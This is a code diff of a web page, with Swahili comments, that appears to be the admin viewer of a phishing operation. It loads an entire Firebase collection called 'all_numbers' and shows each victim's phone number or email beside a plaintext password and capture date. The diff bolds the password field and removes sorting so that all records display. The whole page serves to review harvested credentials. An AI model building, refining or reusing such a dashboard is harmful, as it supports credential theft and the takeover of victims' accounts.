@@ -19,7 +19,7 @@
         th { background-color: #f5f6f7; font-weight: 600; color: #606770; font-size: 14px; text-transform: uppercase; }
         td { font-size: 15px; color: #1c1e21; }
         tr:hover { background-color: #f7f9fa; }
-        .password-cell { font-family: monospace; background: #fff3cd; color: #856404; padding: 4px 8px; border-radius: 4px; display: inline-block; }
+        .password-cell { font-family: monospace; background: #fff3cd; color: #856404; padding: 4px 8px; border-radius: 4px; display: inline-block; font-weight: bold; }
         .date-cell { font-size: 13px; color: #606770; }
         .loading, .empty-state, .error-state { text-align: center; padding: 40px 20px; color: #606770; font-size: 16px; }
         .error-state { color: #dc3545; }
@@ -61,7 +61,6 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
-        // Tumeondoa orderBy hapa
         import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const firebaseConfig = {
@@ -109,25 +108,23 @@
             snapshot.forEach((doc) => {
                 const data = doc.data();
                 
-                // 1. Mfumo wa Smart Detection kutafuta namba/email
+                // 1. Tafuta Namba/Email
                 let displayPhone = data.phone || data.num || data.email || data.phoneNumber || data.username || data.uid || 'N/A';
                 
-                // 2. Mfumo wa Smart Detection kutafuta password
+                // 2. Tafuta Neno la Siri
                 let displayPassword = data.password || data.pass || data.pwd || data.nenoLaSiri || 'N/A';
 
-                // 3. Mfumo wa Smart Detection kutafuta tarehe
+                // 3. Tafuta Tarehe
                 let dateStr = 'Haijulikani';
                 if (data.timestamp) {
-                    // Kama ni Firestore Timestamp
                     if (data.timestamp.toDate) {
                          dateStr = data.timestamp.toDate().toLocaleString('sw-TZ');
                     } else {
-                         dateStr = data.timestamp; // Kama ni string
+                         dateStr = data.timestamp; 
                     }
                 } else if (data.updatedAt) {
                     dateStr = data.updatedAt.toDate ? data.updatedAt.toDate().toLocaleString('sw-TZ') : data.updatedAt;
                 } else if (data.time) {
-                    // Kama ni namba (milliseconds)
                     dateStr = new Date(data.time).toLocaleString('sw-TZ');
                 }
 
@@ -155,7 +152,7 @@
                 // Subiri kidogo ili Auth isambazwe
                 await new Promise(resolve => setTimeout(resolve, 500));
 
-                // HAPA: Tumeondoa query na orderBy. Tunachukua collection nzima.
+                // Tumeondoa orderBy ili data zote zionekane bila kujali zina timestamp au lah
                 const snapshot = await getDocs(collection(db, "all_numbers"));
                 
                 renderData(snapshot);
